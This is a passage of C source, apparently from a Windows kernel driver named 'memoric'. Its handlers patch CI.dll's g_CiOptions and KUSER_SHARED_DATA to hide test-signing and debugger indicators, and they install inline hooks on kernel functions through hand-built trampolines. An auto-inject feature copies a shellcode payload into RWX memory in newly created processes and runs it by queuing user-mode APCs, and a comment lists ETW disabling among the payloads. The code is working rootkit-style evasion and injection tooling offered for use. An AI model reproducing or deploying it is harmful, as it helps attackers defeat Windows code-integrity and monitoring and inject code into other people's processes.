        /* Check if test signing is active via ci.dll g_CiOptions */
        if (g_CiOptionsAddr != 0) {
            ULONG ciOpts = 0;
            __try {
                ciOpts = *(PULONG)g_CiOptionsAddr;
            } __except(EXCEPTION_EXECUTE_HANDLER) {
                ciOpts = 0;
            }
            resp->CiOptions = ciOpts;
            resp->TestSigningActive = (ciOpts & 0x8) ? 1 : 0; /* CODEINTEGRITY_OPTION_ENABLED=1, TESTSIGN=8 in kernel */
            resp->CiOptionsAddress = g_CiOptionsAddr;
        } else {
            /* Try to find g_CiOptions via ci.dll module base scan */
            resp->TestSigningActive = 0;
            resp->CiOptions = 0;
        }

        resp->SharedUserPatched = g_TestSignPatched;
        *BytesReturned = sizeof(MEMORIC_TESTSIGN_RESPONSE);
        DbgPrint("[memoric] TestSign query: active=%lu, ciOptions=0x%X\n",
                 resp->TestSigningActive, resp->CiOptions);
        return STATUS_SUCCESS;
    }

    case MEMORIC_TESTSIGN_HIDE_SHARED:
    {
        /*
         * Patch KUSER_SHARED_DATA to remove test mode indicators.
         * Uses SafeKernelWrite (MmMapIoSpace-based) instead of CR0.WP bypass
         * to be safe under Hyper-V/VBS environments.
         *
         * KUSER_SHARED_DATA layout (relevant fields):
         *   +0x02D4  KdDebuggerEnabled  (UCHAR)
         *   +0x02D7  SafeBootMode       (BOOLEAN) — not test-related but sometimes checked
         *   +0x0308  NtProductType       (ULONG)
         *   +0x02EC  SharedDataFlags     (ULONG) — DbgErrorPortPresent etc.
         *
         * The kernel mapping at 0xFFFFF78000000000 is used.
         * We patch KdDebuggerEnabled and clear debug-related SharedDataFlags bits.
         */
        PUCHAR kernelShared = (PUCHAR)0xFFFFF78000000000ULL;
        UCHAR zero = 0;
        NTSTATUS patchStatus;

        __try {
            /* Zero KdDebuggerEnabled at +0x2D4 */
            patchStatus = SafeKernelWrite(kernelShared + 0x2D4, &zero, sizeof(UCHAR));
            if (!NT_SUCCESS(patchStatus)) {
                DbgPrint("[memoric] TestSign HIDE_SHARED: SafeKernelWrite failed for KdDebuggerEnabled: 0x%08lX\n",
                         patchStatus);
                return patchStatus;
            }

            /* Clear DbgErrorPortPresent bit in SharedDataFlags at +0x02EC.
             * SharedDataFlags bit 0 = DbgErrorPortPresent.
             * Bit 5 = DbgInstallerDetectEnabled. Clear both.
             */
            {
                ULONG sharedFlags = *(PULONG)(kernelShared + 0x02EC);
                ULONG newFlags = sharedFlags & ~0x21UL; /* Clear bits 0 and 5 */
                if (newFlags != sharedFlags) {
                    SafeKernelWrite(kernelShared + 0x02EC, &newFlags, sizeof(ULONG));
                }
            }

            g_TestSignPatched = 1;
            resp->SharedUserPatched = 1;
            resp->TestSigningActive = 0;
            *BytesReturned = sizeof(MEMORIC_TESTSIGN_RESPONSE);
            DbgPrint("[memoric] SharedUserData patched via SafeKernelWrite (Hyper-V safe)\n");
            return STATUS_SUCCESS;
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            DbgPrint("[memoric] Exception patching SharedUserData: 0x%08X\n",
                     GetExceptionCode());
            return STATUS_UNSUCCESSFUL;
        }
    }

    case MEMORIC_TESTSIGN_HIDE_CI:
    {
        /* Patch ci.dll g_CiOptions to clear test signing flag.
           We need to find g_CiOptions address first if not cached. */
        ULONG_PTR cr0;

        if (g_CiOptionsAddr == 0) {
            /* Scan ci.dll for g_CiOptions — look for the CI module in loaded modules */
            PVOID ciBase = NULL;
            ULONG ciSize = 0;
            UNICODE_STRING ciName;
            RtlInitUnicodeString(&ciName, L"CI.dll");

            /* Use MmGetSystemRoutineAddress to check if ci.dll is loaded */
            /* Alternative: walk PsLoadedModuleList to find ci.dll base+size */
            /* For now, use ZwQuerySystemInformation(SystemModuleInformation) */
            ULONG infoSize = 0;
            NTSTATUS st = ZwQuerySystemInformation(11 /*SystemModuleInformation*/, NULL, 0, &infoSize);
            if (infoSize > 0 && infoSize < 4 * 1024 * 1024) {
                PVOID buf = ExAllocatePoolWithTag(NonPagedPool, infoSize, MEMORIC_POOL_TAG);
                if (buf) {
                    st = ZwQuerySystemInformation(11, buf, infoSize, NULL);
                    if (NT_SUCCESS(st)) {
                        PRTL_PROCESS_MODULES mods = (PRTL_PROCESS_MODULES)buf;
                        for (ULONG i = 0; i < mods->NumberOfModules; i++) {
                            PCHAR modName = (PCHAR)(mods->Modules[i].FullPathName + mods->Modules[i].OffsetToFileName);
                            if (_stricmp(modName, "CI.dll") == 0 || _stricmp(modName, "ci.dll") == 0) {
                                ciBase = mods->Modules[i].ImageBase;
                                ciSize = mods->Modules[i].ImageSize;
                                break;
                            }
                        }
                    }
                    ExFreePoolWithTag(buf, MEMORIC_POOL_TAG);
                }
            }

            if (ciBase == NULL) {
                DbgPrint("[memoric] CI.dll not found in loaded modules\n");
                return STATUS_NOT_FOUND;
            }

            /* Scan CI.dll .data section for g_CiOptions.
               g_CiOptions is typically 6 or 0x6 when test signing is enabled.
               Heuristic: find DWORD values of 6 or 0x1E in the .data section. */
            __try {
                PUCHAR base = (PUCHAR)ciBase;
                /* Parse PE headers to find .data section */
                ULONG peOff = *(PULONG)(base + 0x3C);
                PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(base + peOff);
                PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

                for (USHORT s = 0; s < nt->FileHeader.NumberOfSections; s++) {
                    if (sec[s].Name[0] == '.' && sec[s].Name[1] == 'd' &&
                        sec[s].Name[2] == 'a' && sec[s].Name[3] == 't') {
                        PULONG dataStart = (PULONG)(base + sec[s].VirtualAddress);
                        ULONG dataSize = sec[s].Misc.VirtualSize / sizeof(ULONG);
                        for (ULONG d = 0; d < dataSize; d++) {
                            ULONG val = dataStart[d];
                            /* g_CiOptions with test signing: 0x6 (ENABLED=1|TESTSIGN=2 → wait, kernel flags differ)
                               Actually in kernel ci.dll:
                               CODEINTEGRITY_OPTION_ENABLED = 0x1
                               Test signing adds 0x8 flag
                               So test signing active → g_CiOptions has bit 3 set → value like 0x6, 0xE, etc. */
                            if (val == 0x6 || val == 0xE || val == 0x1E || val == 0x26) {
                                g_CiOptionsAddr = (ULONG64)&dataStart[d];
                                g_OriginalCiOptions = val;
                                DbgPrint("[memoric] Found g_CiOptions at 0x%llX (value=0x%X)\n",
                                         g_CiOptionsAddr, val);
                                break;
                            }
                        }
                        break;
                    }
                }
            } __except(EXCEPTION_EXECUTE_HANDLER) {
                DbgPrint("[memoric] Exception scanning CI.dll: 0x%08X\n", GetExceptionCode());
                return STATUS_UNSUCCESSFUL;
            }

            if (g_CiOptionsAddr == 0) {
                DbgPrint("[memoric] g_CiOptions not found in CI.dll\n");
                return STATUS_NOT_FOUND;
            }
        }

        /* Patch g_CiOptions: clear test signing bit (bit 3 = 0x8 in some configurations,
           or bit 1 = 0x2 in others). Clear both to be safe. */
        {
            PULONG ciOpts = (PULONG)g_CiOptionsAddr;
            ULONG oldVal = *ciOpts;
            ULONG newVal = oldVal & ~0xA; /* Clear bits 1 and 3 (0x2 and 0x8) */
            NTSTATUS patchStatus = SafeKernelWrite(ciOpts, &newVal, sizeof(ULONG));
            if (!NT_SUCCESS(patchStatus)) {
                DbgPrint("[memoric] SafeKernelWrite failed patching g_CiOptions: 0x%08X\n", patchStatus);
                return patchStatus;
            }

            resp->CiOptions = newVal;
            resp->CiOptionsAddress = g_CiOptionsAddr;
            resp->TestSigningActive = 0;
            g_TestSignPatched = 1;
            *BytesReturned = sizeof(MEMORIC_TESTSIGN_RESPONSE);
            DbgPrint("[memoric] g_CiOptions patched: 0x%X -> 0x%X\n", oldVal, resp->CiOptions);
            return STATUS_SUCCESS;
        }
    }

    case MEMORIC_TESTSIGN_RESTORE:
    {
        /* Restore original g_CiOptions value */
        if (g_CiOptionsAddr != 0 && g_OriginalCiOptions != 0) {
            NTSTATUS restStatus = SafeKernelWrite(
                (PVOID)g_CiOptionsAddr, &g_OriginalCiOptions, sizeof(ULONG));
            if (NT_SUCCESS(restStatus)) {
                g_TestSignPatched = 0;
                resp->CiOptions = g_OriginalCiOptions;
                resp->TestSigningActive = 1;
                DbgPrint("[memoric] g_CiOptions restored to 0x%X\n", g_OriginalCiOptions);
            } else {
                DbgPrint("[memoric] SafeKernelWrite failed restoring g_CiOptions: 0x%08X\n", restStatus);
                return restStatus;
            }
        }
        *BytesReturned = sizeof(MEMORIC_TESTSIGN_RESPONSE);
        return STATUS_SUCCESS;
    }

    default:
        return STATUS_INVALID_PARAMETER;
    }
}

/* ================================================================
 * Global Hook — kernel-level function hooking
 * ================================================================ */

static struct {
    ULONG   Active;
    ULONG   HookType;
    volatile LONG HitCount;
    CHAR    TargetModule[64];
    CHAR    TargetFunction[64];
    ULONG64 OriginalAddress;
    ULONG64 HookAddress;
    UCHAR   OriginalBytes[16];
    PVOID   TrampolineAddr;    /* Counting trampoline stub (executable pool) */
} g_GlobalHooks[MEMORIC_MAX_GLOBAL_HOOKS] = {0};

static ULONG g_GlobalHookCount = 0;

static NTSTATUS HandleGlobalHook(
    PVOID SystemBuffer,
    ULONG InputBufferLength,
    ULONG OutputBufferLength,
    PULONG BytesReturned)
{
    PMEMORIC_GLOBAL_HOOK_REQUEST req;

    if (InputBufferLength < sizeof(MEMORIC_GLOBAL_HOOK_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_GLOBAL_HOOK_REQUEST)SystemBuffer;

    switch (req->Action) {
    case MEMORIC_GHOOK_INSTALL:
    {
        /* Find a free slot */
        ULONG slot = (ULONG)-1;
        for (ULONG i = 0; i < MEMORIC_MAX_GLOBAL_HOOKS; i++) {
            if (!g_GlobalHooks[i].Active) { slot = i; break; }
        }
        if (slot == (ULONG)-1) {
            DbgPrint("[memoric] No free global hook slots\n");
            return STATUS_INSUFFICIENT_RESOURCES;
        }

        /* Resolve target function address */
        UNICODE_STRING funcName;
        ANSI_STRING ansiFunc;
        RtlInitAnsiString(&ansiFunc, req->TargetFunction);
        NTSTATUS st = RtlAnsiStringToUnicodeString(&funcName, &ansiFunc, TRUE);
        if (!NT_SUCCESS(st)) return st;

        PVOID funcAddr = MmGetSystemRoutineAddress(&funcName);
        RtlFreeUnicodeString(&funcName);

        if (funcAddr == NULL) {
            DbgPrint("[memoric] Function not found: %s\n", req->TargetFunction);
            return STATUS_PROCEDURE_NOT_FOUND;
        }

        /* Install inline hook using SafeKernelWrite (Hyper-V/HVCI safe) */
        __try {
            PUCHAR target = (PUCHAR)funcAddr;

            /* Save original bytes (16 bytes) */
            RtlCopyMemory(g_GlobalHooks[slot].OriginalBytes, target, 16);
            g_GlobalHooks[slot].TrampolineAddr = NULL;

            if (req->ReplacementAddr != 0) {
                ULONG64 hookTarget = req->ReplacementAddr;

                /*
                 * Build a counting trampoline stub that atomically increments
                 * HitCount then jumps to the replacement function.
                 * Layout (29 bytes):
                 *   push rax                           ; 0x50 (1)
                 *   mov rax, &HitCount                 ; 0x48 0xB8 imm64 (10)
                 *   lock inc dword [rax]                ; 0xF0 0xFF 0x00 (3)
                 *   pop rax                             ; 0x58 (1)
                 *   jmp [rip+0]                         ; 0xFF 0x25 0x00000000 (6)
                 *   <ReplacementAddr>                   ; imm64 (8)
                 */
                PVOID trampMem = ExAllocatePool2(
                    POOL_FLAG_NON_PAGED_EXECUTE, 64, MEMORIC_POOL_TAG);
                if (trampMem) {
                    UCHAR trampoline[29];
                    trampoline[0] = 0x50;                               /* push rax */
                    trampoline[1] = 0x48; trampoline[2] = 0xB8;        /* mov rax, imm64 */
                    *(PULONG64)&trampoline[3] = (ULONG64)(ULONG_PTR)&g_GlobalHooks[slot].HitCount;
                    trampoline[11] = 0xF0; trampoline[12] = 0xFF; trampoline[13] = 0x00; /* lock inc dword [rax] */
                    trampoline[14] = 0x58;                              /* pop rax */
                    trampoline[15] = 0xFF; trampoline[16] = 0x25;      /* jmp [rip+0] */
                    *(PULONG)&trampoline[17] = 0;                       /* disp32 = 0 */
                    *(PULONG64)&trampoline[21] = req->ReplacementAddr;  /* target addr */

                    RtlCopyMemory(trampMem, trampoline, 29);
                    g_GlobalHooks[slot].TrampolineAddr = trampMem;
                    hookTarget = (ULONG64)(ULONG_PTR)trampMem;

                    DbgPrint("[memoric] GlobalHook: Trampoline at %p for slot %lu\n", trampMem, slot);
                }
                /* If trampoline allocation failed (e.g., HVCI blocks NX_EXECUTE pool),
                   hookTarget remains as ReplacementAddr — no counting but hook still works */

                /* Build jmp [rip+0]; addr pattern (14 bytes) */
                UCHAR hookPatch[14];
                hookPatch[0] = 0xFF; hookPatch[1] = 0x25;
                *(PULONG)&hookPatch[2] = 0; /* rip+0 offset */
                *(PULONG64)&hookPatch[6] = hookTarget;

                st = SafeKernelWrite(target, hookPatch, 14);
                if (!NT_SUCCESS(st)) {
                    if (g_GlobalHooks[slot].TrampolineAddr) {
                        ExFreePoolWithTag(g_GlobalHooks[slot].TrampolineAddr, MEMORIC_POOL_TAG);
                        g_GlobalHooks[slot].TrampolineAddr = NULL;
                    }
                    DbgPrint("[memoric] SafeKernelWrite failed for hook: 0x%08X\n", st);
                    return st;
                }
            }

            /* Record the hook */
            g_GlobalHooks[slot].Active = 1;
            g_GlobalHooks[slot].HookType = req->HookType;
            g_GlobalHooks[slot].HitCount = 0;
            g_GlobalHooks[slot].OriginalAddress = (ULONG64)funcAddr;
            g_GlobalHooks[slot].HookAddress = req->ReplacementAddr;
            RtlCopyMemory(g_GlobalHooks[slot].TargetModule, req->TargetModule, 64);
            RtlCopyMemory(g_GlobalHooks[slot].TargetFunction, req->TargetFunction, 64);
            g_GlobalHookCount++;

            DbgPrint("[memoric] Global hook installed: slot=%lu, %s!%s @ 0x%llX\n",
                     slot, req->TargetModule, req->TargetFunction, (ULONG64)funcAddr);
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            DbgPrint("[memoric] Exception installing global hook: 0x%08X\n", GetExceptionCode());
            return STATUS_UNSUCCESSFUL;
        }

        /* Return response */
        if (OutputBufferLength >= sizeof(MEMORIC_GLOBAL_HOOK_RESPONSE)) {
            PMEMORIC_GLOBAL_HOOK_RESPONSE resp = (PMEMORIC_GLOBAL_HOOK_RESPONSE)SystemBuffer;
            resp->HookCount = g_GlobalHookCount;
            resp->Entries[0].Index = slot;
            resp->Entries[0].Active = 1;
            resp->Entries[0].HookType = req->HookType;
            resp->Entries[0].HitCount = 0;
            RtlCopyMemory(resp->Entries[0].TargetModule, req->TargetModule, 64);
            RtlCopyMemory(resp->Entries[0].TargetFunction, req->TargetFunction, 64);
            resp->Entries[0].OriginalAddress = g_GlobalHooks[slot].OriginalAddress;
            resp->Entries[0].HookAddress = g_GlobalHooks[slot].HookAddress;
            RtlCopyMemory(resp->Entries[0].OriginalBytes, g_GlobalHooks[slot].OriginalBytes, 16);
            *BytesReturned = sizeof(MEMORIC_GLOBAL_HOOK_RESPONSE);
        }
        return STATUS_SUCCESS;
    }

    case MEMORIC_GHOOK_REMOVE:
    {
        ULONG idx = req->HookIndex;
        if (idx >= MEMORIC_MAX_GLOBAL_HOOKS || !g_GlobalHooks[idx].Active) {
            return STATUS_NOT_FOUND;
        }

        /* Restore original bytes using SafeKernelWrite (Hyper-V safe) */
        {
            PUCHAR target = (PUCHAR)g_GlobalHooks[idx].OriginalAddress;
            NTSTATUS restoreStatus = SafeKernelWrite(target, g_GlobalHooks[idx].OriginalBytes, 16);
            if (!NT_SUCCESS(restoreStatus)) {
                DbgPrint("[memoric] SafeKernelWrite failed restoring hook %lu: 0x%08X\n", idx, restoreStatus);
                return restoreStatus;
            }
        }

        /* Free counting trampoline if allocated */
        if (g_GlobalHooks[idx].TrampolineAddr) {
            ExFreePoolWithTag(g_GlobalHooks[idx].TrampolineAddr, MEMORIC_POOL_TAG);
            g_GlobalHooks[idx].TrampolineAddr = NULL;
        }

        g_GlobalHooks[idx].Active = 0;
        g_GlobalHookCount--;

        DbgPrint("[memoric] Global hook removed: slot=%lu, %s!%s (hits=%ld)\n",
                 idx, g_GlobalHooks[idx].TargetModule, g_GlobalHooks[idx].TargetFunction,
                 g_GlobalHooks[idx].HitCount);

        *BytesReturned = 0;
        return STATUS_SUCCESS;
    }

    case MEMORIC_GHOOK_QUERY:
    {
        ULONG respSize = (ULONG)(sizeof(MEMORIC_GLOBAL_HOOK_RESPONSE) +
                         (MEMORIC_MAX_GLOBAL_HOOKS - 1) * sizeof(MEMORIC_GLOBAL_HOOK_ENTRY));
        if (OutputBufferLength < respSize)
            respSize = OutputBufferLength;

        PMEMORIC_GLOBAL_HOOK_RESPONSE resp = (PMEMORIC_GLOBAL_HOOK_RESPONSE)SystemBuffer;
        RtlZeroMemory(resp, respSize);
        resp->HookCount = g_GlobalHookCount;

        ULONG idx = 0;
        for (ULONG i = 0; i < MEMORIC_MAX_GLOBAL_HOOKS && idx < g_GlobalHookCount; i++) {
            if (g_GlobalHooks[i].Active) {
                ULONG entryOff = (ULONG)(sizeof(MEMORIC_GLOBAL_HOOK_RESPONSE) +
                                  idx * sizeof(MEMORIC_GLOBAL_HOOK_ENTRY) -
                                  sizeof(MEMORIC_GLOBAL_HOOK_ENTRY));
                if (entryOff + sizeof(MEMORIC_GLOBAL_HOOK_ENTRY) > respSize) break;
                PMEMORIC_GLOBAL_HOOK_ENTRY e = &resp->Entries[idx];
                e->Index = i;
                e->Active = 1;
                e->HookType = g_GlobalHooks[i].HookType;
                e->HitCount = g_GlobalHooks[i].HitCount;
                RtlCopyMemory(e->TargetModule, g_GlobalHooks[i].TargetModule, 64);
                RtlCopyMemory(e->TargetFunction, g_GlobalHooks[i].TargetFunction, 64);
                e->OriginalAddress = g_GlobalHooks[i].OriginalAddress;
                e->HookAddress = g_GlobalHooks[i].HookAddress;
                RtlCopyMemory(e->OriginalBytes, g_GlobalHooks[i].OriginalBytes, 16);
                idx++;
            }
        }

        *BytesReturned = respSize;
        DbgPrint("[memoric] GlobalHook query: %lu active hooks\n", g_GlobalHookCount);
        return STATUS_SUCCESS;
    }

    default:
        return STATUS_INVALID_PARAMETER;
    }
}

/* ================================================================
 * Auto-Inject — kernel process creation callback injection
 *
 * Uses PsSetCreateProcessNotifyRoutineEx to monitor new processes
 * and inject specified payloads (testsign hook, ETW disable, etc.)
 * ================================================================ */

static ULONG g_AutoInjectEnabled = 0;
static ULONG g_AutoInjectFlags = 0;
static ULONG g_AutoInjectCount = 0;
static ULONG g_AutoInjectFailed = 0;
static ULONG g_AutoInjectSkipped = 0;
static WCHAR g_AutoInjectFilter[64] = {0};

/* Shellcode payload for auto-injection */
static PVOID  g_AutoInjectPayload = NULL;
static SIZE_T g_AutoInjectPayloadSize = 0;

/* Pending injection PID queue */
#define AUTO_INJECT_MAX_PENDING 32
static HANDLE g_AutoInjectPendingPids[AUTO_INJECT_MAX_PENDING] = {0};
static LONG   g_AutoInjectPendingCount = 0;

static void AutoInjectAddPendingPid(HANDLE pid) {
    LONG idx = InterlockedIncrement(&g_AutoInjectPendingCount) - 1;
    if (idx < AUTO_INJECT_MAX_PENDING) {
        g_AutoInjectPendingPids[idx] = pid;
    } else {
        InterlockedDecrement(&g_AutoInjectPendingCount);
    }
}

static BOOLEAN AutoInjectRemovePendingPid(HANDLE pid) {
    for (LONG i = 0; i < g_AutoInjectPendingCount && i < AUTO_INJECT_MAX_PENDING; i++) {
        if (g_AutoInjectPendingPids[i] == pid) {
            g_AutoInjectPendingPids[i] = NULL;
            return TRUE;
        }
    }
    return FALSE;
}

/* APC routines for auto-injection */
static VOID AutoInjectApcKernelRoutine(
    PKAPC Apc,
    PKNORMAL_ROUTINE *NormalRoutine,
    PVOID *NormalContext,
    PVOID *SystemArgument1,
    PVOID *SystemArgument2)
{
    UNREFERENCED_PARAMETER(NormalRoutine);
    UNREFERENCED_PARAMETER(NormalContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);
    ExFreePoolWithTag(Apc, MEMORIC_POOL_TAG);
}

static VOID AutoInjectApcRundownRoutine(PKAPC Apc)
{
    ExFreePoolWithTag(Apc, MEMORIC_POOL_TAG);
}

/*
 * Deferred work item context for auto-inject.
 * Thread creation callbacks run in a critical region at PASSIVE_LEVEL,
 * but heavy operations (KeStackAttachProcess, ZwAllocateVirtualMemory,
 * APC queuing) should be deferred to avoid blocking the callback and
 * potentially deadlocking.
 */
typedef struct _AUTOINJECT_WORK_CONTEXT {
    WORK_QUEUE_ITEM WorkItem;
    HANDLE ProcessId;
    HANDLE ThreadId;
} AUTOINJECT_WORK_CONTEXT, *PAUTOINJECT_WORK_CONTEXT;

static VOID AutoInjectWorkerRoutine(PVOID Parameter)
{
    PAUTOINJECT_WORK_CONTEXT ctx = (PAUTOINJECT_WORK_CONTEXT)Parameter;
    PEPROCESS process = NULL;
    PETHREAD thread = NULL;
    NTSTATUS st;
    PVOID remoteAddr = NULL;
    SIZE_T regionSize;
    KAPC_STATE apcState;

    st = PsLookupProcessByProcessId(ctx->ProcessId, &process);
    if (!NT_SUCCESS(st)) {
        InterlockedIncrement((PLONG)&g_AutoInjectFailed);
        ExFreePoolWithTag(ctx, MEMORIC_POOL_TAG);
        return;
    }

    st = PsLookupThreadByThreadId(ctx->ThreadId, &thread);
    if (!NT_SUCCESS(st)) {
        ObDereferenceObject(process);
        InterlockedIncrement((PLONG)&g_AutoInjectFailed);
        ExFreePoolWithTag(ctx, MEMORIC_POOL_TAG);
        return;
    }

    /* Allocate RWX memory in the target process */
    regionSize = g_AutoInjectPayloadSize;

    KeStackAttachProcess(process, &apcState);

    __try {
        st = ZwAllocateVirtualMemory(
            ZwCurrentProcess(), &remoteAddr, 0, &regionSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (NT_SUCCESS(st) && remoteAddr) {
            RtlCopyMemory(remoteAddr, g_AutoInjectPayload, g_AutoInjectPayloadSize);
            DbgPrint("[memoric] AutoInject worker: Allocated %llu bytes at %p in PID %p\n",
                     (ULONG64)g_AutoInjectPayloadSize, remoteAddr, ctx->ProcessId);
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        st = GetExceptionCode();
        remoteAddr = NULL;
    }

    KeUnstackDetachProcess(&apcState);

    if (!NT_SUCCESS(st) || !remoteAddr) {
        ObDereferenceObject(thread);
        ObDereferenceObject(process);
        InterlockedIncrement((PLONG)&g_AutoInjectFailed);
        DbgPrint("[memoric] AutoInject worker: Memory allocation failed: 0x%08X\n", st);
        ExFreePoolWithTag(ctx, MEMORIC_POOL_TAG);
        return;
    }

    /* Resolve APC function pointers if not yet done */
    if (!pfnKeInitializeApc || !pfnKeInsertQueueApc) {
        UNICODE_STRING fn1, fn2;
        RtlInitUnicodeString(&fn1, L"KeInitializeApc");
        RtlInitUnicodeString(&fn2, L"KeInsertQueueApc");
        pfnKeInitializeApc = (PFN_KeInitializeApc)MmGetSystemRoutineAddress(&fn1);
        pfnKeInsertQueueApc = (PFN_KeInsertQueueApc)MmGetSystemRoutineAddress(&fn2);
    }
    if (!pfnKeInitializeApc || !pfnKeInsertQueueApc) {
        ObDereferenceObject(thread);
        ObDereferenceObject(process);
        InterlockedIncrement((PLONG)&g_AutoInjectFailed);
        ExFreePoolWithTag(ctx, MEMORIC_POOL_TAG);
        return;
    }

    {
        PKAPC apc = (PKAPC)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KAPC), MEMORIC_POOL_TAG);
        if (!apc) {
            ObDereferenceObject(thread);
            ObDereferenceObject(process);
            InterlockedIncrement((PLONG)&g_AutoInjectFailed);
            ExFreePoolWithTag(ctx, MEMORIC_POOL_TAG);
            return;
        }

        pfnKeInitializeApc(
            apc,
            (PKTHREAD)thread,
            OriginalApcEnvironment,
            (PKKERNEL_ROUTINE)AutoInjectApcKernelRoutine,
            (PKRUNDOWN_ROUTINE)AutoInjectApcRundownRoutine,
            (PKNORMAL_ROUTINE)remoteAddr,
            UserMode,
            NULL);

        if (pfnKeInsertQueueApc(apc, NULL, NULL, 0)) {
            InterlockedIncrement((PLONG)&g_AutoInjectCount);
            DbgPrint("[memoric] AutoInject worker: APC queued to TID %p in PID %p\n",
                     ctx->ThreadId, ctx->ProcessId);
        } else {
            ExFreePoolWithTag(apc, MEMORIC_POOL_TAG);
            InterlockedIncrement((PLONG)&g_AutoInjectFailed);
            DbgPrint("[memoric] AutoInject worker: KeInsertQueueApc failed for PID %p\n",
                     ctx->ProcessId);
        }
    }

    ObDereferenceObject(thread);
    ObDereferenceObject(process);
    ExFreePoolWithTag(ctx, MEMORIC_POOL_TAG);
}

static BOOLEAN g_AutoInjectThreadCallbackRegistered = FALSE;

static VOID AutoInjectThreadNotify(
    HANDLE ProcessId,
    HANDLE ThreadId,
    BOOLEAN Create)
{
    PAUTOINJECT_WORK_CONTEXT ctx;

    if (!Create || !g_AutoInjectEnabled) return;
    if (!g_AutoInjectPayload || g_AutoInjectPayloadSize == 0) return;

    /* Check if this PID is in our pending list */
    if (!AutoInjectRemovePendingPid(ProcessId)) return;

    DbgPrint("[memoric] AutoInject: Thread %p created in pending PID %p, deferring to work item...\n",
             ThreadId, ProcessId);

    /*
     * Defer heavy work (KeStackAttachProcess, ZwAllocateVirtualMemory, APC queuing)
     * to a system worker thread via ExQueueWorkItem(DelayedWorkQueue).
     *
     * Thread creation callbacks run at PASSIVE_LEVEL but in a critical region
     * (APC delivery disabled). Performing heavy ops directly can cause deadlocks
     * or excessive callback duration. The work item runs at PASSIVE_LEVEL with
     * APCs enabled, which is the correct context for these operations.
     */
    ctx = (PAUTOINJECT_WORK_CONTEXT)ExAllocatePool2(
        POOL_FLAG_NON_PAGED, sizeof(AUTOINJECT_WORK_CONTEXT), MEMORIC_POOL_TAG);
    if (!ctx) {
        InterlockedIncrement((PLONG)&g_AutoInjectFailed);
        return;
    }

    ctx->ProcessId = ProcessId;
    ctx->ThreadId = ThreadId;
    ExInitializeWorkItem(&ctx->WorkItem, AutoInjectWorkerRoutine, ctx);
    ExQueueWorkItem(&ctx->WorkItem, DelayedWorkQueue);
}

/* Auto-inject process creation callback */
static VOID AutoInjectCreateProcessNotify(
    PEPROCESS Process,
    HANDLE ProcessId,
    PPS_CREATE_NOTIFY_INFO CreateInfo)
{
    UNREFERENCED_PARAMETER(Process);

    if (!g_AutoInjectEnabled || CreateInfo == NULL) return; /* exit notification or disabled */

    /* Check filter */
    if (g_AutoInjectFilter[0] != L'\0' && CreateInfo->ImageFileName != NULL) {
        UNICODE_STRING filter;
        RtlInitUnicodeString(&filter, g_AutoInjectFilter);
        /* Simple substring match */
        BOOLEAN match = FALSE;
        if (CreateInfo->ImageFileName->Length >= filter.Length) {
            /* Check if filter appears at end of image path */
            USHORT startPos = (CreateInfo->ImageFileName->Length - filter.Length) / sizeof(WCHAR);
            UNICODE_STRING suffix;
            suffix.Buffer = CreateInfo->ImageFileName->Buffer + startPos;
            suffix.Length = filter.Length;
            suffix.MaximumLength = filter.Length;
            if (RtlCompareUnicodeString(&suffix, &filter, TRUE) == 0)
                match = TRUE;
        }
        if (!match) {
            InterlockedIncrement((PLONG)&g_AutoInjectSkipped);
            return;
        }
    }

    DbgPrint("[memoric] AutoInject: new process PID=%lu, flags=0x%X — queued for injection\n",
             (ULONG)(ULONG_PTR)ProcessId, g_AutoInjectFlags);

    /* Add to pending queue; the thread callback will perform the actual injection */
    AutoInjectAddPendingPid(ProcessId);
}

static BOOLEAN g_AutoInjectCallbackRegistered = FALSE;

static NTSTATUS HandleAutoInject(
    PVOID SystemBuffer,
    ULONG InputBufferLength,
    ULONG OutputBufferLength,
    PULONG BytesReturned)
{
    PMEMORIC_AUTO_INJECT_REQUEST req;

    if (InputBufferLength < sizeof(MEMORIC_AUTO_INJECT_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_AUTO_INJECT_REQUEST)SystemBuffer;

    switch (req->Action) {
    case MEMORIC_AUTOINJECT_ENABLE:
    {
        if (!g_AutoInjectCallbackRegistered) {
            NTSTATUS st = PsSetCreateProcessNotifyRoutineEx(AutoInjectCreateProcessNotify, FALSE);
            if (!NT_SUCCESS(st)) {
                DbgPrint("[memoric] Failed to register auto-inject callback: 0x%08X\n", st);
                return st;
            }
            g_AutoInjectCallbackRegistered = TRUE;
        }

        /* Register thread creation callback for actual injection */
        if (!g_AutoInjectThreadCallbackRegistered) {
            NTSTATUS st = PsSetCreateThreadNotifyRoutine(AutoInjectThreadNotify);
            if (!NT_SUCCESS(st)) {
                DbgPrint("[memoric] Failed to register thread notify: 0x%08X\n", st);
                /* Non-fatal: injection will just not work automatically */
            } else {
                g_AutoInjectThreadCallbackRegistered = TRUE;
            }
        }

        g_AutoInjectEnabled = 1;
        g_AutoInjectFlags = req->Flags;
        RtlCopyMemory(g_AutoInjectFilter, req->ProcessFilter, sizeof(g_AutoInjectFilter));
        g_AutoInjectCount = 0;
        g_AutoInjectFailed = 0;
        g_AutoInjectSkipped = 0;

        DbgPrint("[memoric] AutoInject enabled: flags=0x%X\n", req->Flags);

        /* Fall through to query response */
        goto autoinject_query;
    }

    case MEMORIC_AUTOINJECT_DISABLE:
    {
        g_AutoInjectEnabled = 0;

        if (g_AutoInjectCallbackRegistered) {
            PsSetCreateProcessNotifyRoutineEx(AutoInjectCreateProcessNotify, TRUE);
            g_AutoInjectCallbackRegistered = FALSE;
        }

        if (g_AutoInjectThreadCallbackRegistered) {
            PsRemoveCreateThreadNotifyRoutine(AutoInjectThreadNotify);
            g_AutoInjectThreadCallbackRegistered = FALSE;
        }

        /* Clear pending PIDs */
        RtlZeroMemory(g_AutoInjectPendingPids, sizeof(g_AutoInjectPendingPids));
        g_AutoInjectPendingCount = 0;

        DbgPrint("[memoric] AutoInject disabled\n");
        goto autoinject_query;
    }

    case MEMORIC_AUTOINJECT_QUERY:
